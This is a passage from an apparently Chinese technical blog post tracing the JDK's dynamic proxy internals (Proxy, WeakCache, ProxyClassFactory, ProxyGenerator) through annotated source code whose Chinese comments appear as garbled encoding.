&#125;<br>                &#125;);<br>            &#125;<br>            <span class="hljs-keyword">return</span> cons.newInstance(<span class="hljs-keyword">new</span> Object[]&#123;h&#125;);<br>        ...<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> Class&lt;?&gt; getProxyClass0(ClassLoader loader,<br>                                       Class&lt;?&gt;... interfaces) &#123;<br>    <span class="hljs-keyword">if</span> (interfaces.length &gt; <span class="hljs-number">65535</span>) &#123;<span class="hljs-comment">// åˆ¤æ–­æ¥å£æ•°æ˜¯å¦è¿‡å¤š</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<span class="hljs-string">&quot;interface limit exceeded&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// If the proxy class defined by the given loader implementing</span><br>    <span class="hljs-comment">// the given interfaces exists, this will simply return the cached copy;</span><br>    <span class="hljs-comment">// otherwise, it will create the proxy class via the ProxyClassFactory</span><br>    <span class="hljs-comment">// ç¿»è¯‘ï¼šå®ç°ç»™å®šæ¥å£çš„ç»™å®šåŠ è½½å™¨å®šä¹‰çš„ä»£ç†ç±»å­˜åœ¨ï¼Œåˆ™åªè¿”å›ç¼“å­˜å‰¯æœ¬ï¼›å¦åˆ™ï¼Œå®ƒå°†é€šè¿‡ProxyClassFactoryåˆ›å»ºä»£ç†ç±»</span><br>    <span class="hljs-keyword">return</span> proxyClassCache.get(loader, interfaces);<span class="hljs-comment">// è·Ÿè¿›</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">//</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> V <span class="hljs-title">get</span><span class="hljs-params">(K key, P parameter)</span> </span>&#123;<span class="hljs-comment">// ç°åœ¨ç¼“å­˜ä¸­æŸ¥æ‰¾æ˜¯å¦å­˜åœ¨å·²ç”Ÿæˆçš„ä»£ç†ç±»ï¼Œè‹¥æ²¡æœ‰åˆ™é€šè¿‡</span><br>    Objects.requireNonNull(parameter);<span class="hljs-comment">// åˆ¤æ–­pæ˜¯å¦ä¸ºç©º</span><br><br>    expungeStaleEntries();<span class="hljs-comment">// åˆ é™¤å·²ç»è¢«åƒåœ¾å›æ”¶çš„é”®æ‰€å¯¹åº”çš„æ¡ç›®</span><br><br>    Object cacheKey = CacheKey.valueOf(key, refQueue);<br><br>    <span class="hljs-comment">// lazily install the 2nd level valuesMap for the particular cacheKey</span><br>    ConcurrentMap&lt;Object, Supplier&lt;V&gt;&gt; valuesMap = map.get(cacheKey);<br>    <span class="hljs-keyword">if</span> (valuesMap == <span class="hljs-keyword">null</span>) &#123;<br>        ConcurrentMap&lt;Object, Supplier&lt;V&gt;&gt; oldValuesMap<br>            = map.putIfAbsent(cacheKey,<br>                              valuesMap = <span class="hljs-keyword">new</span> ConcurrentHashMap&lt;&gt;());<br>        <span class="hljs-keyword">if</span> (oldValuesMap != <span class="hljs-keyword">null</span>) &#123;<br>            valuesMap = oldValuesMap;<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-comment">// create subKey and retrieve the possible Supplier&lt;V&gt; stored by that</span><br>    <span class="hljs-comment">// subKey from valuesMap</span><br>    Object subKey = Objects.requireNonNull(subKeyFactory.apply(key, parameter));<br>    Supplier&lt;V&gt; supplier = valuesMap.get(subKey);<span class="hljs-comment">// ä¸Šé¢å…¨éƒ¨æ˜¯ä»ç¼“å­˜æˆ–å·²ç”Ÿæˆçš„æ¡ç›®ä¸­è·å–æ˜¯å¦å­˜åœ¨æˆ‘ä»¬æƒ³è¦çš„åŠ¨æ€ä»£ç†å¯¹è±¡</span><br>    Factory factory = <span class="hljs-keyword">null</span>;<span class="hljs-comment">// å·¥å‚ç±»ï¼Œä¸»è¦å®ç°å€¼çš„æ„é€ å¹¶å°†å…¶æ”¾å…¥åˆ°ç¼“å­˜ä¸­</span><br><br>    <span class="hljs-keyword">while</span> (<span class="hljs-keyword">true</span>) &#123;<span class="hljs-comment">// supplierä¸€èˆ¬åœ¨ç¬¬ä¸€æ¬¡æ—¶ä¸ºnullï¼Œåœ¨ç”Ÿæˆè¿‡ä»£ç†å¯¹è±¡åä¼šå¢åŠ ç¼“å­˜</span><br>        <span class="hljs-keyword">if</span> (supplier != <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// supplierä»£è¡¨ç»“æœä¾›åº”å•†ã€‚æ­¤å¤„ä»£è¡¨ä¸€ä¸ªfactory,ç”¨äºæŸ¥æ‰¾æˆ–ç”Ÿæˆä»£ç†å¯¹è±¡çš„ä¾›åº”å•†</span><br>            <span class="hljs-comment">// supplier might be a Factory or a CacheValue&lt;V&gt; instance</span><br>            V value = supplier.get();<span class="hljs-comment">// è¿™ç§æƒ…å†µæ˜¯æœ‰ç¼“å­˜æ—¶ï¼Œæ­¤å¤„è‹¥æ²¡æœ‰ç¼“å­˜ä¼šå…ˆç”Ÿæˆfactoryå¹¶å¢åŠ ç¼“å­˜ï¼Œç„¶åè·å–ä»£ç†å¯¹è±¡</span><br>            <span class="hljs-keyword">if</span> (value != <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-keyword">return</span> value;<br>            &#125;<br>        &#125;<br>        <span class="hljs-comment">// else no supplier in cache</span><br>        <span class="hljs-comment">// or a supplier that returned null (could be a cleared CacheValue</span><br>        <span class="hljs-comment">// or a Factory that wasn&#x27;t successful in installing the CacheValue)</span><br><br>        <span class="hljs-comment">// lazily construct a Factory</span><br>        <span class="hljs-keyword">if</span> (factory == <span class="hljs-keyword">null</span>) &#123;<br>            factory = <span class="hljs-keyword">new</span> Factory(key, parameter, subKey, valuesMap);<span class="hljs-comment">// æ–°å»ºä¸ªå·¥å‚ç±»ï¼Œæ„é€ å™¨å°±æ˜¯ç®€å•çš„èµ‹å€¼</span><br>        &#125;<br><br>        <span class="hljs-keyword">if</span> (supplier == <span class="hljs-keyword">null</span>) &#123;<br>            supplier = valuesMap.putIfAbsent(subKey, factory);<span class="hljs-comment">// subKeyä½œä¸ºé”®ï¼Œfactoryä½œä¸ºå€¼æ”¾å…¥åˆ°valuesMapä¸­</span><br>            <span class="hljs-comment">// å¢åŠ ç¼“å­˜</span><br>            <span class="hljs-keyword">if</span> (supplier == <span class="hljs-keyword">null</span>) &#123;<br>                <span class="hljs-comment">// successfully installed Factory</span><br>                supplier = factory;<span class="hljs-comment">// å·¥å‚ç±»èµ‹å€¼åˆ°supplierï¼Œç„¶åä»æ–°è¿›å…¥whileå¾ªç¯</span><br>            &#125;<br>            <span class="hljs-comment">// else retry with winning supplier</span><br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-keyword">if</span> (valuesMap.replace(subKey, supplier, factory)) &#123;<br>                <span class="hljs-comment">// successfully replaced</span><br>                <span class="hljs-comment">// cleared CacheEntry / unsuccessful Factory</span><br>                <span class="hljs-comment">// with our Factory</span><br>                supplier = factory;<br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-comment">// retry with current supplier</span><br>                supplier = valuesMap.get(subKey);<br>            &#125;<br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// java.lang.reflect.WeakCache$Factory$Supplier#get()</span><br><span class="hljs-meta">@Override</span><br><span class="hljs-function"><span class="hljs-keyword">public</span> <span class="hljs-keyword">synchronized</span> V <span class="hljs-title">get</span><span class="hljs-params">()</span> </span>&#123; <span class="hljs-comment">// serialize access</span><br>    <span class="hljs-comment">// re-check</span><br>    Supplier&lt;V&gt; supplier = valuesMap.get(subKey);<br>    <span class="hljs-keyword">if</span> (supplier != <span class="hljs-keyword">this</span>) &#123;<br>        <span class="hljs-comment">// something changed while we were waiting:</span><br>        <span class="hljs-comment">// might be that we were replaced by a CacheValue</span><br>        <span class="hljs-comment">// or were removed because of failure -&gt;</span><br>        <span class="hljs-comment">// return null to signal WeakCache.get() to retry</span><br>        <span class="hljs-comment">// the loop</span><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>    &#125;<br>    <span class="hljs-comment">// å†æ¬¡æ£€æµ‹çš„ç›®çš„ï¼Œæ˜¯å› ä¸ºåœ¨ç­‰å¾…æ—¶å¯èƒ½å‘ç”Ÿäº†ä¸€äº›å˜åŒ–ï¼šä¹Ÿè®¸æ˜¯CacheValueè¢«æ›¿æ¢æˆ–è€…è¢«åˆ é™¤</span><br>    <span class="hljs-comment">// else still us (supplier == this)</span><br><br>    <span class="hljs-comment">// create new value</span><br>    V value = <span class="hljs-keyword">null</span>;<br>    <span class="hljs-keyword">try</span> &#123;<span class="hljs-comment">// ç”ŸæˆåŠ¨æ€ä»£ç†ç±»ï¼Œå¹¶åˆ¤æ–­ä¸‹æ˜¯å¦æˆåŠŸç”Ÿæˆ</span><br>        value = Objects.requireNonNull(valueFactory.apply(key, parameter));<br>    &#125; <span class="hljs-keyword">finally</span> &#123;<br>        <span class="hljs-keyword">if</span> (value == <span class="hljs-keyword">null</span>) &#123; <span class="hljs-comment">// remove us on failure</span><br>            valuesMap.remove(subKey, <span class="hljs-keyword">this</span>);<br>        &#125;<br>    &#125;<br>    <span class="hljs-comment">// the only path to reach here is with non-null value</span><br>    <span class="hljs-keyword">assert</span> value != <span class="hljs-keyword">null</span>;<br><br>    <span class="hljs-comment">// wrap value with CacheValue (WeakReference)</span><br>    CacheValue&lt;V&gt; cacheValue = <span class="hljs-keyword">new</span> CacheValue&lt;&gt;(value);<br><br>    <span class="hljs-comment">// put into reverseMap</span><br>    reverseMap.put(cacheValue, Boolean.TRUE);<br><br>    <span class="hljs-comment">// try replacing us with CacheValue (this should always succeed)</span><br>    <span class="hljs-keyword">if</span> (!valuesMap.replace(subKey, <span class="hljs-keyword">this</span>, cacheValue)) &#123;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> AssertionError(<span class="hljs-string">&quot;Should not reach here&quot;</span>);<br>    &#125;<br><br>    <span class="hljs-comment">// successfully replaced us with new CacheValue -&gt; return the value</span><br>    <span class="hljs-comment">// wrapped by it</span><br>    <span class="hljs-keyword">return</span> value;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="/2022/09/03/Java%E5%8A%A8%E6%80%81%E4%BB%A3%E7%90%86/5.png"></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// java.lang.reflect.Proxy.ProxyClassFactory#apply()</span><br><span class="hljs-keyword">public</span> Class&lt;?&gt; apply(ClassLoader loader, Class&lt;?&gt;[] interfaces) &#123;<br>    Map&lt;Class&lt;?&gt;, Boolean&gt; interfaceSet = <span class="hljs-keyword">new</span> IdentityHashMap&lt;&gt;(interfaces.length);<br>    <span class="hljs-keyword">for</span> (Class&lt;?&gt; intf : interfaces) &#123;<br>        <span class="hljs-comment">// éªŒè¯ç±»åŠ è½½å™¨æ˜¯å¦å°†æ­¤æ¥å£çš„åç§°è§£æä¸ºåŒä¸€ä¸ªclasså¯¹è±¡ã€‚</span><br>        Class&lt;?&gt; interfaceClass = <span class="hljs-keyword">null</span>;<br>        <span class="hljs-keyword">try</span> &#123;<br>            interfaceClass = Class.forName(intf.getName(), <span class="hljs-keyword">false</span>, loader);<br>        &#125; <span class="hljs-keyword">catch</span> (ClassNotFoundException e) &#123;<br>        &#125;<br>        <span class="hljs-keyword">if</span> (interfaceClass != intf) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<br>                intf + <span class="hljs-string">&quot; is not visible from class loader&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">// éªŒè¯Classå¯¹è±¡æ˜¯å¦å®é™…è¡¨ç¤ºæ¥å£ã€‚æ­¤å¤„ä¹Ÿè¯´æ˜äº†ä¸ºä»€ä¹ˆJDKåŠ¨æ€ä»£ç†ä¸ºä»€ä¹ˆåªèƒ½ä»£ç†æ¥å£</span><br>        <span class="hljs-keyword">if</span> (!interfaceClass.isInterface()) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<br>                interfaceClass.getName() + <span class="hljs-string">&quot; is not an interface&quot;</span>);<br>        &#125;<br>        <br>        <span class="hljs-comment">// éªŒè¯æ­¤æ¥å£ä¸æ˜¯é‡å¤çš„ã€‚</span><br>        <span class="hljs-keyword">if</span> (interfaceSet.put(interfaceClass, Boolean.TRUE) != <span class="hljs-keyword">null</span>) &#123;<br>            <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<br>                <span class="hljs-string">&quot;repeated interface: &quot;</span> + interfaceClass.getName());<br>        &#125;<br>    &#125;<br><br>    String proxyPkg = <span class="hljs-keyword">null</span>;     <span class="hljs-comment">// ä»£ç†å¯¹è±¡çš„åŒ…å</span><br>    <span class="hljs-keyword">int</span> accessFlags = Modifier.PUBLIC | Modifier.FINAL; <span class="hljs-comment">// è®¿é—®æ§åˆ¶ç¬¦</span><br><br>    <span class="hljs-comment">// è®°å½•éå…¬å…±ä»£ç†æ¥å£çš„åŒ…ï¼Œä»¥ä¾¿åœ¨åŒä¸€åŒ…ä¸­å®šä¹‰ä»£ç†ç±»ã€‚éªŒè¯æ‰€æœ‰éå…¬å…±ä»£ç†æ¥å£æ˜¯å¦ä½äºåŒä¸€åŒ…ä¸­ã€‚æ­¤å¤„ç¨å¾®çœ‹çœ‹</span><br>    <span class="hljs-keyword">for</span> (Class&lt;?&gt; intf : interfaces) &#123;<br>        <span class="hljs-keyword">int</span> flags = intf.getModifiers();<br>        <span class="hljs-keyword">if</span> (!Modifier.isPublic(flags)) &#123;<br>            accessFlags = Modifier.FINAL;<br>            String name = intf.getName();<br>            <span class="hljs-keyword">int</span> n = name.lastIndexOf(<span class="hljs-string">&#x27;.&#x27;</span>);<br>            String pkg = ((n == -<span class="hljs-number">1</span>) ? <span class="hljs-string">&quot;&quot;</span> : name.substring(<span class="hljs-number">0</span>, n + <span class="hljs-number">1</span>));<br>            <span class="hljs-keyword">if</span> (proxyPkg == <span class="hljs-keyword">null</span>) &#123;<br>                proxyPkg = pkg;<br>            &#125; <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> (!pkg.equals(proxyPkg)) &#123;<br>                <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(<br>                    <span class="hljs-string">&quot;non-public interfaces from different packages&quot;</span>);<br>            &#125;<br>        &#125;<br>    &#125;<br><br>    <br>    <span class="hljs-keyword">if</span> (proxyPkg == <span class="hljs-keyword">null</span>) &#123;<span class="hljs-comment">// </span><br>        <span class="hljs-comment">// å¦‚æœæ²¡æœ‰éå…¬å…±çš„æ¥å£ï¼ŒåŒ…åå°±æ˜¯com.sun.proxy.</span><br>        proxyPkg = ReflectUtil.PROXY_PACKAGE + <span class="hljs-string">&quot;.&quot;</span>;<br>    &#125;<br><br>    <span class="hljs-keyword">long</span> num = nextUniqueNumber.getAndIncrement();<span class="hljs-comment">// ç¬¬å‡ ä¸ªåŠ¨æ€ä»£ç†ç±»</span><br>    String proxyName = proxyPkg + proxyClassNamePrefix + num;<span class="hljs-comment">// åŠ¨æ€ä»£ç†ç±»åï¼šcom.sun.proxy.$Proxy+æ•°å­—</span><br><br>    <span class="hljs-comment">// ç”ŸæˆæŒ‡å®šçš„ä»£ç†ç±»</span><br>    <span class="hljs-keyword">byte</span>[] proxyClassFile = ProxyGenerator.generateProxyClass(<br>        proxyName, interfaces, accessFlags);<span class="hljs-comment">// è·Ÿè¿›çœ‹ä¸€ä¸‹</span><br>    <span class="hljs-keyword">try</span> &#123;<br>        <span class="hljs-keyword">return</span> defineClass0(loader, proxyName,<br>                            proxyClassFile, <span class="hljs-number">0</span>, proxyClassFile.length);<span class="hljs-comment">// åŠ è½½ç”Ÿæˆçš„ä»£ç†ç±»å­—èŠ‚ç </span><br>    &#125; <span class="hljs-keyword">catch</span> (ClassFormatError e) &#123;<br>        <span class="hljs-comment">/*</span><br><span class="hljs-comment">                 * A ClassFormatError here means that (barring bugs in the</span><br><span class="hljs-comment">                 * proxy class generation code) there was some other</span><br><span class="hljs-comment">                 * invalid aspect of the arguments supplied to the proxy</span><br><span class="hljs-comment">                 * class creation (such as virtual machine limitations</span><br><span class="hljs-comment">                 * exceeded).</span><br><span class="hljs-comment">                 */</span><br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> IllegalArgumentException(e.toString());<br>    &#125;<br>&#125;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">// sun.misc.ProxyGenerator#generateProxyClass(java.lang.String, java.lang.Class&lt;?&gt;[], int)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">byte</span>[] generateProxyClass(<span class="hljs-keyword">final</span> String var0, Class&lt;?&gt;[] var1, <span class="hljs-keyword">int</span> var2) &#123;<br>    ProxyGenerator var3 = <span class="hljs-keyword">new</span> ProxyGenerator(var0, var1, var2);<span class="hljs-comment">// ç”ŸæˆProxyGeneratorå¯¹è±¡</span><br>    <span class="hljs-comment">// var0:åŠ¨æ€ä»£ç†ç±»å…¨ç±»åï¼Œvar1:æŒ‡å®šçš„ä»£ç†ç±»æ¥å£,var2:æƒé™è¡¨ç¤ºç¬¦</span><br>    <span class="hljs-keyword">final</span> <span class="hljs-keyword">byte</span>[] var4 = var3.generateClassFile();<span class="hljs-comment">// ç”Ÿæˆclassæ–‡ä»¶</span><br>    <span class="hljs-keyword">if</span> (saveGeneratedFiles) &#123;<span class="hljs-comment">// ç¡®å®šç”Ÿæˆçš„classæ–‡ä»¶æ˜¯å¦ä¿å­˜,saveGeneratedFilesé»˜è®¤ä¸ºfalse</span><br>        AccessController.doPrivileged(<span class="hljs-keyword">new</span> PrivilegedAction&lt;Void&gt;() &#123;<br>            <span class="hljs-function"><span class="hljs-keyword">public</span> Void <span class="hljs-title">run</span><span class="hljs-params">()</span> </span>&#123;<br>                <span class="hljs-keyword">try</span> &#123;<br>                    <span class="hljs-keyword">int</span> var1 = var0.lastIndexOf(<span class="hljs-number">46</span>);<br>                    Path var2;<br>                    <span class="hljs-keyword">if</span> (var1 &gt; <span class="hljs-number">0</span>) &#123;<br>                        Path var3 = Paths.get(var0.substring(<span class="hljs-number">0</span>, var1).replace(<span class="hljs-string">&#x27;.&#x27;</span>, File.separatorChar));<br>                        Files.createDirectories(var3);<br>                        var2 = var3.resolve(var0.substring(var1 + <span class="hljs-number">1</span>, var0.length()) + <span class="hljs-string">&quot;.class&quot;</span>);<br>                    &#125; <span class="hljs-keyword">else</span> &#123;<br>                        var2 = Paths.get(var0 + <span class="hljs-string">&quot;.class&quot;</span>);<br>                    &#125;<br><br>                    Files.write(var2, var4, <span class="hljs-keyword">new</span> OpenOption[<span class="hljs-number">0</span>]);<br>                    <span class="hljs-keyword">return</span> <span class="hljs-keyword">null</span>;<br>                &#125; <span class="hljs-keyword">catch</span> (IOException var4x) &#123;<br>                    <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> InternalError(<span class="hljs-string">&quot;I/O exception saving generated file: &quot;</span> + var4x);<br>                &#125;<br>            &#125;<br>        &#125;);<br>    &#125;<br><br>    <span class="hljs-keyword">return</span> var4;<span class="hljs-comment">// è¿”å›classFileçš„å­—èŠ‚æ•°ç»„</span><br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/**</span><br><span class="hljs-comment"> * param1:ä»£ç†ç±»çš„å…¨ç±»å</span><br><span class="hljs-comment"> * param2:ä»£ç†æ¥å£çš„.class</span><br><span class="hljs-comment"> * param3:æƒé™ä¿®é¥°ç¬¦</span><br><span class="hljs-comment"> */</span><br><span class="hljs-keyword">private</span> <span class="hljs-keyword">byte</span>[] generateClassFile() &#123;<br>    <span class="hljs-comment">// step1:ä¸ºæ‰€æœ‰æ–¹æ³•ç»„è£…ProxyMethodå¯¹è±¡ä»¥ç”Ÿæˆä»£ç†åˆ†æ´¾ä»£ç ã€‚</span><br>    <span class="hljs-comment">// è®°å½•java.lang.Objectçš„hashCodeã€equalså’ŒtoStringæ–¹æ³•éœ€è¦ä»£ç†æ–¹æ³•ã€‚</span><br>    <span class="hljs-comment">// è¿™æ˜¯åœ¨ä»£ç†æ¥å£çš„æ–¹æ³•ä¹‹å‰å®Œæˆçš„ï¼Œä»¥ä¾¿java.lang.Oobjectçš„æ–¹æ³•ä¼˜å…ˆäºä»£ç†æ¥å£ä¸­çš„é‡å¤æ–¹æ³•ã€‚</span><br>    <span class="hljs-keyword">this</span>.addProxyMethod(hashCodeMethod, Object.class);<br>    <span class="hljs-keyword">this</span>.addProxyMethod(equalsMethod, Object.class);<br>    <span class="hljs-keyword">this</span>.addProxyMethod(toStringMethod, Object.class);<br>    Class[] var1 = <span class="hljs-keyword">this</span>.interfaces;<span class="hljs-comment">// è·å–æ‰€æœ‰çš„ä»£ç†æ¥å£</span><br>    <span class="hljs-keyword">int</span> var2 = var1.length;<span class="hljs-comment">// 